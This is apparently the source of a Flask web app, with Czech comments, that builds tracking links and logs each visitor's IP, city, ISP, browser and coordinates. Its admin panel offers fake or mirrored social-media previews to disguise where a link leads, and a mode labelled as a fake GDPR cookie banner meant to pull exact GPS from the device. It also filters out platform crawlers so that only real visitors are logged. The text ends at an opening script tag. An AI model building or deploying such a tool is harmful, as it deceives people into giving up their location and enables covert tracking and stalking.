import os
import sqlite3
import string
import secrets
from datetime import datetime
import zoneinfo
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, redirect, render_template_string, jsonify, abort, Response

app = Flask(__name__)
DB_FILE = os.getenv("DB_PATH", "redirector.db")
TZ_PRAGUE = zoneinfo.ZoneInfo("Europe/Prague")

def get_now_local_str():
    return datetime.now(TZ_PRAGUE).strftime("%Y-%m-%d %H:%M:%S")

def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    with conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                log_code TEXT UNIQUE,
                target_url TEXT NOT NULL,
                cloaking_mode TEXT DEFAULT 'neutral',
                gps_mode TEXT DEFAULT 'silent',
                custom_title TEXT DEFAULT '',
                custom_desc TEXT DEFAULT '',
                custom_image TEXT DEFAULT '',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cursor = conn.execute("PRAGMA table_info(links)")
        cols_links = [row["name"] for row in cursor.fetchall()]
        if "log_code" not in cols_links:
            conn.execute("ALTER TABLE links ADD COLUMN log_code TEXT")
            existing = conn.execute("SELECT id FROM links WHERE log_code IS NULL").fetchall()
            for row in existing:
                conn.execute("UPDATE links SET log_code = ? WHERE id = ?", (generate_code(6), row["id"]))
        if "cloaking_mode" not in cols_links:
            conn.execute("ALTER TABLE links ADD COLUMN cloaking_mode TEXT DEFAULT 'neutral'")
        if "gps_mode" not in cols_links:
            conn.execute("ALTER TABLE links ADD COLUMN gps_mode TEXT DEFAULT 'silent'")
        if "custom_title" not in cols_links:
            conn.execute("ALTER TABLE links ADD COLUMN custom_title TEXT DEFAULT ''")
        if "custom_desc" not in cols_links:
            conn.execute("ALTER TABLE links ADD COLUMN custom_desc TEXT DEFAULT ''")
        if "custom_image" not in cols_links:
            conn.execute("ALTER TABLE links ADD COLUMN custom_image TEXT DEFAULT ''")

        conn.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                latitude REAL,
                longitude REAL,
                exact_gps INTEGER DEFAULT 0,
                gps_accuracy REAL,
                browser_name TEXT,
                user_agent TEXT,
                referer TEXT,
                is_bot INTEGER DEFAULT 0,
                bot_name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (link_id) REFERENCES links(id)
            )
        """)
        cursor = conn.execute("PRAGMA table_info(logs)")
        cols_logs = [row["name"] for row in cursor.fetchall()]
        if "is_bot" not in cols_logs:
            conn.execute("ALTER TABLE logs ADD COLUMN is_bot INTEGER DEFAULT 0")
        if "bot_name" not in cols_logs:
            conn.execute("ALTER TABLE logs ADD COLUMN bot_name TEXT")
        if "exact_gps" not in cols_logs:
            conn.execute("ALTER TABLE logs ADD COLUMN exact_gps INTEGER DEFAULT 0")
        if "gps_accuracy" not in cols_logs:
            conn.execute("ALTER TABLE logs ADD COLUMN gps_accuracy REAL")
        if "browser_name" not in cols_logs:
            conn.execute("ALTER TABLE logs ADD COLUMN browser_name TEXT")

    conn.close()

def generate_code(length=6):
    chars = string.ascii_letters + string.digits
    return ''.join(secrets.choice(chars) for _ in range(length))

def generate_digit_code(length=6):
    return ''.join(secrets.choice(string.digits) for _ in range(length))

def get_client_ip():
    # 1. Cloudflare header
    cf_ip = request.headers.get("CF-Connecting-IP")
    if cf_ip and cf_ip.strip() not in ("127.0.0.1", "::1"):
        return cf_ip.strip()
    
    # 2. X-Real-IP
    x_real_ip = request.headers.get("X-Real-IP")
    if x_real_ip and x_real_ip.strip() not in ("127.0.0.1", "::1"):
        return x_real_ip.strip()

    # 3. X-Forwarded-For (projdeme vsechny zleva a vezmeme prvni verejnou IP)
    xff = request.headers.get("X-Forwarded-For")
    if xff:
        parts = [p.strip() for p in xff.split(",") if p.strip()]
        for ip in parts:
            if ip not in ("127.0.0.1", "::1") and not ip.startswith("10.") and not ip.startswith("192.168."):
                return ip
        if parts:
            return parts[0]
        
    return request.remote_addr

def parse_browser_name(ua):
    ua_lower = (ua or "").lower()
    # Scraperi a boti nejsou bezne prohlizece:
    if "facebookexternalhit" in ua_lower or "meta-externalagent" in ua_lower or "facebookcatalog" in ua_lower:
        return "Meta Crawler"
    if "discordbot" in ua_lower or "telegrambot" in ua_lower or "twitterbot" in ua_lower:
        return "Bot Crawler"
    if "brave" in ua_lower:
        return "Brave"
    if "instagram" in ua_lower:
        return "Instagram App"
    if "fbav" in ua_lower or "fban" in ua_lower:
        return "Facebook App"
    if "edg/" in ua_lower:
        return "Edge"
    if "opr/" in ua_lower or "opera" in ua_lower:
        return "Opera"
    if "chrome" in ua_lower and "safari" in ua_lower and "edg" not in ua_lower:
        return "Chrome"
    if "firefox" in ua_lower:
        return "Firefox"
    if "safari" in ua_lower and "chrome" not in ua_lower:
        return "Safari"
    return "Neznamy"

BOT_UA_PATTERNS = [
    ("facebookexternalhit", "Meta Preview Crawler"),
    ("facebookcatalog", "Meta Catalog Bot"),
    ("meta-externalagent", "Meta Preview Agent"),
    ("discordbot", "Discord Bot"),
    ("twitterbot", "Twitter/X Bot"),
    ("telegrambot", "Telegram Bot"),
    ("whatsapp", "WhatsApp Crawler"),
    ("slackbot", "Slack Bot"),
    ("googlebot", "Googlebot"),
    ("bingbot", "Bingbot"),
    ("yandexbot", "YandexBot"),
    ("duckduckbot", "DuckDuckBot"),
    ("applebot", "Applebot"),
    ("baiduspider", "Baidu Spider"),
    ("bytespider", "ByteDance Bot"),
    ("semrushbot", "Semrush Bot"),
    ("ahrefsbot", "Ahrefs Bot"),
    ("mj12bot", "MJ12 Bot"),
    ("headlesschrome", "Headless Chrome"),
    ("phantomjs", "PhantomJS"),
    ("puppeteer", "Puppeteer"),
    ("playwright", "Playwright"),
    ("curl/", "cURL CLI"),
    ("wget/", "Wget CLI"),
    ("python-requests", "Python Requests"),
    ("aiohttp", "Python aiohttp"),
    ("httpx", "Python httpx"),
]

BOT_ISP_PATTERNS = [
    ("facebook", "Meta Datacenter"),
    ("meta platforms", "Meta Datacenter"),
    ("amazon", "AWS Datacenter"),
    ("digitalocean", "DigitalOcean"),
    ("hetzner", "Hetzner"),
    ("ovh", "OVH"),
    ("linode", "Linode / Akamai"),
    ("oracle", "Oracle Cloud"),
]

def check_bot(user_agent, isp):
    ua_lower = (user_agent or "").lower()
    isp_lower = (isp or "").lower()

    # 1. POUZE skutecny in-app browser z mobilni aplikace (ktery neni crawler):
    is_real_mobile_inapp = ("instagram" in ua_lower or "fbav" in ua_lower) and \
                           ("mobile" in ua_lower or "android" in ua_lower or "iphone" in ua_lower) and \
                           ("externalhit" not in ua_lower and "externalagent" not in ua_lower)
    if is_real_mobile_inapp:
        return False, ""

    # 2. Skutecni preview crawleři a boti podle User-Agenta (facebookexternalhit ma absolutni prioritu jako BOT):
    for pattern, name in BOT_UA_PATTERNS:
        if pattern in ua_lower:
            return True, name

    # 3. Datacentrum Meta / Facebook bez standardního prohlížeče:
    for pattern, name in BOT_ISP_PATTERNS:
        if pattern in isp_lower:
            if "facebook" in pattern or "meta" in pattern:
                return True, name
            if not ("mozilla/" in ua_lower and ("windows" in ua_lower or "android" in ua_lower or "iphone" in ua_lower or "macintosh" in ua_lower)):
                return True, name

    return False, ""

def get_geoip_data(ip):
    if not ip or ip in ("127.0.0.1", "::1") or ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16."):
        return {
            "country": "Local",
            "city": "Local",
            "isp": "Local",
            "lat": 0.0,
            "lon": 0.0
        }
    
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon", timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country"),
                    "city": data.get("city"),
                    "isp": data.get("isp"),
                    "lat": data.get("lat"),
                    "lon": data.get("lon")
                }
    except Exception as e:
        print(f"GeoIP error for {ip}: {e}")
        
    return {
        "country": "Unknown",
        "city": "Unknown",
        "isp": "Unknown",
        "lat": None,
        "lon": None
    }

def fetch_target_metadata(url):
    meta = {"title": "", "desc": "", "image": ""}
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        r = requests.get(url, headers=headers, timeout=4)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "html.parser")
            t = soup.find("meta", property="og:title") or soup.find("title")
            d = soup.find("meta", property="og:description") or soup.find("meta", attrs={"name": "description"})
            img = soup.find("meta", property="og:image")
            
            meta["title"] = t.get("content", t.text if t else "") if t else ""
            meta["desc"] = d.get("content", "") if d else ""
            meta["image"] = img.get("content", "") if img else ""
    except Exception as e:
        print(f"Metadata fetch error: {e}")
    return meta

init_db()

# -------------------------------------------------------------
# PROTECTED ADMIN & MANAGEMENT INTERFACE (/ip na kersonik.me)
# -------------------------------------------------------------
@app.route("/ip", methods=["GET", "POST"])
@app.route("/ip/", methods=["GET", "POST"])
def admin_index():
    conn = get_db()
    if request.method == "POST":
        action = request.form.get("action")
        if action == "delete_link":
            link_id = request.form.get("link_id")
            if link_id:
                with conn:
                    conn.execute("DELETE FROM logs WHERE link_id = ?", (link_id,))
                    conn.execute("DELETE FROM links WHERE id = ?", (link_id,))
                conn.close()
                return redirect("/ip")

        target_url = request.form.get("target_url", "").strip()
        cloaking_mode = request.form.get("cloaking_mode", "neutral")
        gps_mode = request.form.get("gps_mode", "silent")
        custom_title = request.form.get("custom_title", "").strip()
        custom_desc = request.form.get("custom_desc", "").strip()
        custom_image = request.form.get("custom_image", "").strip()

        if not target_url:
            conn.close()
            return "Chybi cilova URL", 400
        if not target_url.startswith(("http://", "https://")):
            target_url = "https://" + target_url

        slug = generate_code(6)
        log_id = generate_digit_code(6)

        while conn.execute("SELECT id FROM links WHERE id = ?", (slug,)).fetchone():
            slug = generate_code(6)
        while conn.execute("SELECT id FROM links WHERE log_code = ?", (log_id,)).fetchone():
            log_id = generate_digit_code(6)

        with conn:
            conn.execute("""
                INSERT INTO links (id, log_code, target_url, cloaking_mode, gps_mode, custom_title, custom_desc, custom_image, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (slug, log_id, target_url, cloaking_mode, gps_mode, custom_title, custom_desc, custom_image, get_now_local_str()))
        conn.close()
        
        return redirect(f"/ip/{log_id}")

    links = conn.execute("SELECT * FROM links ORDER BY created_at DESC").fetchall()
    conn.close()
    
    html = """
    <!DOCTYPE html>
    <html lang="cs">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>IP Tracker</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            :root {
                --bg: #090d13;
                --panel: #111622;
                --border: #232c3d;
                --border-hover: #3b82f6;
                --accent: #60a5fa;
                --text: #c9d1d9;
                --text-bright: #ffffff;
                --text-dim: #768390;
                --badge-bg: #1c2333;
            }
            body { background-color: var(--bg); color: var(--text); font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace; }
            .card { background-color: var(--panel); border: 1px solid var(--border); border-radius: 6px; }
            .form-control, .form-select { background-color: var(--bg); border: 1px solid var(--border); color: #fff; font-size: 0.9rem; }
            .form-control:focus, .form-select:focus { background-color: var(--bg); border-color: var(--border-hover); color: #fff; box-shadow: none; }
            .table { color: var(--text); font-size: 0.88rem; }
            .table-dark { background-color: #121824; }
            .table-dark thead th { background-color: #0d1117 !important; color: #ffffff !important; border-bottom: 2px solid var(--border) !important; font-weight: 600; }
            a { color: var(--accent); text-decoration: none; }
            a:hover { text-decoration: underline; color: #93c5fd; }
            .btn-primary { background-color: #2563eb; border: none; font-weight: 500; font-size: 0.9rem; }
            .btn-primary:hover { background-color: #1d4ed8; }
            .badge-code { background: var(--badge-bg); color: #38bdf8; padding: 3px 6px; border-radius: 4px; border: 1px solid rgba(56, 189, 248, 0.2); }
            .badge-public { background: #272115; color: #fbbf24; padding: 3px 6px; border-radius: 4px; border: 1px solid rgba(251, 191, 36, 0.3); cursor: pointer !important; user-select: none; }
            .badge-public:hover { background: #3b3220; cursor: pointer !important; }
        </style>
    </head>
    <body class="p-3 p-md-4">
        <div class="container" style="max-width: 1040px;">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div>
                    <h3 class="text-white mb-0">IP Tracker</h3>
                    <small class="text-secondary">Sprava mericich odkazu a GeoIP logu</small>
                </div>
                <a href="/" class="btn btn-outline-secondary btn-sm">&larr; Dashboard</a>
            </div>

            <div class="card shadow-sm mb-4">
                <div class="card-body p-4">
                    <h6 class="card-title text-white mb-3">Vytvorit novy merici odkaz</h6>
                    <form method="POST">
                        <div class="mb-3">
                            <label class="form-label text-secondary small">Cilova URL (kam uzivatel doopravdy pujde):</label>
                            <input type="text" name="target_url" class="form-control" placeholder="https://youtube.com/watch?v=..." required>
                        </div>
                        <div class="row g-2 mb-3">
                            <div class="col-md-6">
                                <label class="form-label text-secondary small">Rezim nahledu (Instagram / Facebook preview):</label>
                                <select name="cloaking_mode" class="form-select" id="cloakSelect" onchange="toggleCustom()">
                                    <option value="neutral">Neutralni (zadne preview / cisty link)</option>
                                    <option value="custom">Vlastni falesny nahled (Fake Preview)</option>
                                    <option value="mirror">Zrcadlit cilovy web (Preview cile bez prozrazeni URL)</option>
                                </select>
                            </div>
                            <div class="col-md-6">
                                <label class="form-label text-secondary small">Ziskavani polohy (GPS):</label>
                                <select name="gps_mode" class="form-select">
                                    <option value="silent">Tiche GeoIP (podle IP adresy / operatora, okamzity skok)</option>
                                    <option value="cookie_prompt">Presne GPS zarizeni (Fake GDPR Cookie banner)</option>
                                </select>
                            </div>
                        </div>

                        <div id="customPreviewFields" style="display: none;" class="p-3 mb-3 border rounded border-secondary">
                            <div class="mb-2">
                                <label class="form-label text-secondary small">Falesny Titulek (Title):</label>
                                <input type="text" name="custom_title" class="form-control" placeholder="napr. Podivej se na tuhle fotku">
                            </div>
                            <div class="mb-2">
                                <label class="form-label text-secondary small">Falesny Popis (Description):</label>
                                <input type="text" name="custom_desc" class="form-control" placeholder="napr. Odeslano pres Instagram">
                            </div>
                            <div class="mb-2">
                                <label class="form-label text-secondary small">Falesny Obrazek URL (Image):</label>
                                <input type="text" name="custom_image" class="form-control" placeholder="https://example.com/photo.jpg">
                            </div>
                        </div>

                        <button type="submit" class="btn btn-primary">Vygenerovat odkaz</button>
                    </form>
                </div>
            </div>

            <div class="card shadow-sm">
                <div class="card-body p-4">
                    <h6 class="card-title text-white mb-3">Seznam odkazu</h6>
                    <div class="table-responsive">
                        <table class="table table-dark table-hover align-middle mt-2 mb-0">
                            <thead>
                                <tr style="border-bottom: 2px solid var(--border);">
                                    <th>Cil</th>
                                    <th>Rezim nahledu</th>
                                    <th>Verejny odkaz</th>
                                    <th>Logy</th>
                                    <th class="text-center" style="width: 100px;">Akce</th>
                                </tr>
                            </thead>
                            <tbody id="adminLinksTableBody">
                                {% for link in links %}
                                <tr>
                                    <td style="max-width: 230px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                                        <a href="{{ link['target_url'] }}" target="_blank" class="text-secondary">{{ link['target_url'] }}</a>
                                    </td>
                                    <td>
                                        <span class="badge bg-secondary" style="font-size: 0.75rem;">{{ link['cloaking_mode'] or 'neutral' }}</span>
                                    </td>
                                    <td>
                                        <span class="badge-public font-monospace" onclick="copyText('https://ahoj.kersonik.me/{{ link['id'] }}', this)" title="Kliknutim zkopirujes odkaz">
                                            ahoj.kersonik.me/{{ link['id'] }}
                                        </span>
                                    </td>
                                    <td>
                                        <a href="/ip/{{ link['log_code'] or link['id'] }}" class="badge-code font-monospace">
                                            kersonik.me/ip/{{ link['log_code'] or link['id'] }}
                                        </a>
                                    </td>
                                    <td class="text-center align-middle">
                                        <form method="POST" class="d-inline m-0" onsubmit="return confirm('Smazat tento odkaz a veskere logy?');">
                                            <input type="hidden" name="action" value="delete_link">
                                            <input type="hidden" name="link_id" value="{{ link['id'] }}">
                                            <button type="submit" class="btn btn-sm btn-outline-danger py-1 px-3" style="font-size: 0.8rem;">Smazat</button>
                                        </form>
                                    </td>
                                </tr>
                                {% endfor %}
                                {% if not links %}
                                <tr>
                                    <td colspan="5" class="text-center text-secondary py-4">Zadne aktivni odkazy.</td>
                                </tr>
                                {% endif %}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <script>
            function toggleCustom() {
                var sel = document.getElementById("cloakSelect").value;
                document.getElementById("customPreviewFields").style.display = (sel === "custom") ? "block" : "none";
            }
            function copyText(text, elem) {
                navigator.clipboard.writeText(text).then(function() {
                    var orig = elem.innerText;
                    elem.innerText = "Zkopirovano!";
                    elem.style.background = "#14532d";
                    elem.style.color = "#4ade80";
                    setTimeout(function() {
                        elem.innerText = orig;
                        elem.style.background = "";
                        elem.style.color = "";
                    }, 1500);
                });
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html, links=links)

@app.route("/ip/<log_code>", methods=["GET", "POST"])
def admin_stats(log_code):
    conn = get_db()
    link = conn.execute("SELECT * FROM links WHERE log_code = ? OR id = ?", (log_code, log_code)).fetchone()
    if not link:
        conn.close()
        abort(404, "Zaznam nenalezen")

    if request.method == "POST":
        action = request.form.get("action")
        if action == "update_url":
            new_target = request.form.get("target_url", "").strip()
            new_mode = request.form.get("cloaking_mode", "neutral")
            new_gps_mode = request.form.get("gps_mode", "silent")
            new_title = request.form.get("custom_title", "").strip()
            new_desc = request.form.get("custom_desc", "").strip()
            new_image = request.form.get("custom_image", "").strip()

            if new_target:
                if not new_target.startswith(("http://", "https://")):
                    new_target = "https://" + new_target
                with conn:
                    conn.execute("""
                        UPDATE links 
                        SET target_url = ?, cloaking_mode = ?, gps_mode = ?, custom_title = ?, custom_desc = ?, custom_image = ?
                        WHERE id = ?
                    """, (new_target, new_mode, new_gps_mode, new_title, new_desc, new_image, link["id"]))
                conn.close()
                return redirect(f"/ip/{log_code}")
        elif action == "delete_link":
            with conn:
                conn.execute("DELETE FROM logs WHERE link_id = ?", (link["id"],))
                conn.execute("DELETE FROM links WHERE id = ?", (link["id"],))
            conn.close()
            return redirect("/ip")

    filter_type = request.args.get("filter", "all")
    if filter_type == "real":
        logs = conn.execute("SELECT * FROM logs WHERE link_id = ? AND (is_bot = 0 OR is_bot IS NULL) ORDER BY created_at DESC", (link["id"],)).fetchall()
    elif filter_type == "bots":
        logs = conn.execute("SELECT * FROM logs WHERE link_id = ? AND is_bot = 1 ORDER BY created_at DESC", (link["id"],)).fetchall()
    else:
        logs = conn.execute("SELECT * FROM logs WHERE link_id = ? ORDER BY created_at DESC", (link["id"],)).fetchall()

    all_count = conn.execute("SELECT COUNT(*) FROM logs WHERE link_id = ?", (link["id"],)).fetchone()[0]
    bot_count = conn.execute("SELECT COUNT(*) FROM logs WHERE link_id = ? AND is_bot = 1", (link["id"],)).fetchone()[0]
    real_count = all_count - bot_count
    conn.close()
    
    html = """
    <!DOCTYPE html>
    <html lang="cs">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Logy: {{ link['log_code'] }}</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            :root {
                --bg: #090d13;
                --panel: #111622;
                --border: #232c3d;
                --border-hover: #3b82f6;
                --accent: #60a5fa;
                --text: #c9d1d9;
                --text-dim: #768390;
            }
            body { background-color: var(--bg); color: var(--text); font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace; }
            .card { background-color: var(--panel); border: 1px solid var(--border); border-radius: 6px; }
            .form-control, .form-select { background-color: var(--bg); border: 1px solid var(--border); color: #fff; font-size: 0.88rem; }
            .form-control:focus, .form-select:focus { background-color: var(--bg); border-color: var(--border-hover); color: #fff; box-shadow: none; }
            .table { color: var(--text); font-size: 0.82rem; }
            .table-dark { background-color: #121824; }
            .table-dark thead th {
                background-color: #0d1117 !important;
                color: #ffffff !important;
                border-bottom: 2px solid var(--border) !important;
                font-weight: 600;
                white-space: nowrap;
                padding: 10px 8px;
            }
            .table td {
                padding: 8px;
            }
            a { color: var(--accent); text-decoration: none; }
            a:hover { text-decoration: underline; }
            .badge-public { background: #272115; color: #fbbf24; padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(251, 191, 36, 0.3); }
            .badge-bot {
                background: rgba(239, 68, 68, 0.15);
                color: #f87171;
                border: 1px solid rgba(239, 68, 68, 0.3);
                padding: 3px 8px;
                border-radius: 4px;
                font-size: 0.72rem;
                display: inline-block;
                white-space: nowrap;
                line-height: 1.2;
            }
            .badge-real {
                background: rgba(34, 197, 94, 0.15);
                color: #4ade80;
                border: 1px solid rgba(34, 197, 94, 0.3);
                padding: 3px 8px;
                border-radius: 4px;
                font-size: 0.72rem;
                display: inline-block;
                white-space: nowrap;
                line-height: 1.2;
            }
            .filter-btn { font-size: 0.8rem; padding: 3px 10px; border-radius: 4px; text-decoration: none; border: 1px solid var(--border); color: var(--text-dim); }
            .filter-btn.active { background: #1c2333; color: #fff; border-color: var(--accent); }
            details.ua-details summary {
                cursor: pointer;
                outline: none;
                user-select: none;
                color: var(--text-dim);
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
                max-width: 100%;
                display: list-item;
                font-family: monospace;
            }
            details.ua-details summary:hover {
                color: var(--accent);
            }
            details.ua-details[open] summary {
                margin-bottom: 4px;
                color: var(--accent);
            }
            details.ua-details .ua-full {
                word-break: break-all;
                white-space: normal;
                background: rgba(0, 0, 0, 0.4);
                border: 1px solid var(--border);
                border-radius: 4px;
                padding: 6px 8px;
                color: var(--text);
                font-size: 0.72rem;
                max-height: 160px;
                overflow-y: auto;
            }
        </style>
    </head>
    <body class="p-3 p-md-4">
        <div class="container-fluid px-3 px-md-4" style="max-width: 1440px;">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div>
                    <h3 class="text-white mb-0">Logy k linku: <code>{{ link['log_code'] }}</code></h3>
                    <small class="text-secondary">Chraneny prehled na kersonik.me/ip</small>
                </div>
                <a href="/ip" class="btn btn-outline-secondary btn-sm">&larr; Zpet</a>
            </div>

            <div class="card mb-4 p-4 shadow-sm">
                <div class="row align-items-center">
                    <div class="col-md-6 mb-3">
                        <span class="text-secondary small d-block">Verejny odkaz:</span>
                        <span class="badge-public font-monospace d-inline-block mt-1" onclick="copyText('https://ahoj.kersonik.me/{{ link['id'] }}', this)" title="Kliknutim zkopirujes odkaz">
                            https://ahoj.kersonik.me/{{ link['id'] }}
                        </span>
                    </div>
                    <div class="col-md-6 mb-3">
                        <span class="text-secondary small d-block">Admin odkaz:</span>
                        <code class="text-info">https://kersonik.me/ip/{{ link['log_code'] }}</code>
                    </div>

                    <div class="col-12 mt-2">
                        <form method="POST">
                            <input type="hidden" name="action" value="update_url">
                            <div class="row g-2 align-items-end">
                                <div class="col-md-5">
                                    <label class="text-secondary small">Cilova URL:</label>
                                    <input type="text" name="target_url" class="form-control" value="{{ link['target_url'] }}" required>
                                </div>
                                <div class="col-md-4">
                                    <label class="text-secondary small">Rezim nahledu:</label>
                                    <select name="cloaking_mode" class="form-select" id="cloakEditSelect" onchange="toggleEditCustom()">
                                        <option value="neutral" {{ 'selected' if link['cloaking_mode'] == 'neutral' else '' }}>Neutralni (zadne preview)</option>
                                        <option value="custom" {{ 'selected' if link['cloaking_mode'] == 'custom' else '' }}>Vlastni falesny nahled</option>
                                        <option value="mirror" {{ 'selected' if link['cloaking_mode'] == 'mirror' else '' }}>Zrcadlit cilovy web</option>
                                    </select>
                                </div>
                                <div class="col-md-3">
                                    <label class="text-secondary small">Ziskavani polohy:</label>
                                    <select name="gps_mode" class="form-select">
                                        <option value="silent" {{ 'selected' if (link['gps_mode'] or 'silent') == 'silent' else '' }}>Tiche GeoIP (IP operatora)</option>
                                        <option value="cookie_prompt" {{ 'selected' if link['gps_mode'] == 'cookie_prompt' else '' }}>Presne GPS (Cookie banner)</option>
                                    </select>
                                </div>
                                <div class="col-md-12 mt-2">
                                    <button type="submit" class="btn btn-sm btn-primary py-2 px-4">Ulozit nastaveni</button>
                                </div>
                            </div>

                            <div id="editCustomFields" style="display: {{ 'block' if link['cloaking_mode'] == 'custom' else 'none' }};" class="mt-3 p-3 border rounded border-secondary">
                                <div class="row g-2">
                                    <div class="col-md-4">
                                        <label class="text-secondary small">Falesny Titulek:</label>
                                        <input type="text" name="custom_title" class="form-control" value="{{ link['custom_title'] or '' }}" placeholder="Titulek">
                                    </div>
                                    <div class="col-md-4">
                                        <label class="text-secondary small">Falesny Popis:</label>
                                        <input type="text" name="custom_desc" class="form-control" value="{{ link['custom_desc'] or '' }}" placeholder="Popis">
                                    </div>
                                    <div class="col-md-4">
                                        <label class="text-secondary small">Falesny Obrazek URL:</label>
                                        <input type="text" name="custom_image" class="form-control" value="{{ link['custom_image'] or '' }}" placeholder="https://...">
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>

                    <div class="col-12 d-flex justify-content-between align-items-center mt-3 pt-3 border-top border-secondary">
                        <div class="d-flex gap-2 align-items-center" id="filterButtonsGroup">
                            <span class="text-secondary small me-2">Filtrovat:</span>
                            <a href="/ip/{{ link['log_code'] }}?filter=all" class="filter-btn {{ 'active' if filter_type == 'all' else '' }}">Vse (<span id="countAll">{{ all_count }}</span>)</a>
                            <a href="/ip/{{ link['log_code'] }}?filter=real" class="filter-btn {{ 'active' if filter_type == 'real' else '' }}">Uzivatele (<span id="countReal">{{ real_count }}</span>)</a>
                            <a href="/ip/{{ link['log_code'] }}?filter=bots" class="filter-btn {{ 'active' if filter_type == 'bots' else '' }}">Boti (<span id="countBots">{{ bot_count }}</span>)</a>
                        </div>
                        <form method="POST" onsubmit="return confirm('Smazat link a vsechny logy?');">
                            <input type="hidden" name="action" value="delete_link">
                            <button type="submit" class="btn btn-sm btn-outline-danger py-0 px-2" style="font-size: 0.8rem;">Smazat link</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="card shadow-sm">
                <div class="card-body p-4">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <div class="d-flex align-items-center gap-2">
                            <h6 class="card-title text-white mb-0">Zaznamy pristupu</h6>
                            <span id="liveIndicator" class="badge" style="background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); font-size: 0.65rem;">● LIVE</span>
                        </div>
                        <div class="form-check form-switch mb-0">
                            <input class="form-check-input" type="checkbox" id="autoRefreshToggle" checked>
                            <label class="form-check-label text-secondary small" for="autoRefreshToggle">Auto-obnova (3s)</label>
                        </div>
                    </div>
                    <div class="table-responsive" id="tableContainer">
                        <table class="table table-dark table-hover table-bordered align-middle mb-0">
                            <thead>
                                <tr>
                                    <th style="width: 140px;">Cas</th>
                                    <th style="width: 110px;">Prohlizec</th>
                                    <th style="width: 130px;">Typ</th>
                                    <th style="width: 130px;">IP adresa</th>
                                    <th style="width: 90px;">Stat</th>
                                    <th style="width: 100px;">Mesto</th>
                                    <th>ISP</th>
                                    <th style="width: 170px;">GPS</th>
                                    <th style="width: 250px;">User-Agent</th>
                                </tr>
                            </thead>
                            <tbody id="logsTableBody">
                                {% for log in logs %}
                                <tr>
                                    <td class="text-nowrap">{{ log['created_at'] }}</td>
                                    <td>
                                        {% if log['browser_name'] == 'Brave' %}
                                            <span class="badge" style="background: rgba(251, 146, 60, 0.2); color: #fb923c; border: 1px solid rgba(251, 146, 60, 0.4); font-size: 0.75rem;">Brave Browser</span>
                                        {% elif log['browser_name'] %}
                                            <span class="badge bg-secondary" style="font-size: 0.75rem;">{{ log['browser_name'] }}</span>
                                        {% else %}
                                            <span class="text-secondary">-</span>
                                        {% endif %}
                                    </td>
                                    <td>
                                        {% if log['is_bot'] %}
                                            <span class="badge-bot" title="{{ log['bot_name'] }}">{{ log['bot_name'] or 'Bot' }}</span>
                                        {% else %}
                                            <span class="badge-real">Uzivatel</span>
                                        {% endif %}
                                    </td>
                                    <td><code class="text-warning fw-bold">{{ log['ip'] }}</code></td>
                                    <td>{{ log['country'] or 'N/A' }}</td>
                                    <td>{{ log['city'] or 'N/A' }}</td>
                                    <td>{{ log['isp'] or 'N/A' }}</td>
                                    <td class="text-nowrap" style="font-size: 0.78rem;">
                                        {% if log['latitude'] and log['longitude'] %}
                                            <a href="https://www.google.com/maps?q={{ log['latitude'] }},{{ log['longitude'] }}" target="_blank">
                                                {{ '%.3f' % log['latitude'] }}, {{ '%.3f' % log['longitude'] }}
                                            </a>
                                            {% if log['exact_gps'] %}
                                                <span class="badge bg-success ms-1" style="font-size: 0.65rem;" title="Presne GPS ze zarizeni (presnost cca {{ log['gps_accuracy']|int }}m)">GPS</span>
                                            {% else %}
                                                <span class="badge bg-secondary ms-1" style="font-size: 0.65rem;">IP</span>
                                            {% endif %}
                                        {% else %}
                                            <span class="text-secondary">N/A</span>
                                        {% endif %}
                                    </td>
                                    <td style="font-size: 0.75rem; max-width: 250px;">
                                        {% if log['user_agent'] %}
                                            <details class="ua-details">
                                                <summary title="Kliknutim rozbalis / sbalis cely User-Agent">{{ log['user_agent'][:28] }}...</summary>
                                                <div class="ua-full">{{ log['user_agent'] }}</div>
                                            </details>
                                        {% else %}
                                            <span class="text-secondary">-</span>
                                        {% endif %}
                                    </td>
                                </tr>
                                {% endfor %}
                                {% if not logs %}
                                <tr>
                                    <td colspan="9" class="text-center text-secondary py-4">Zadne zaznamy.</td>
                                </tr>
                                {% endif %}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <script>
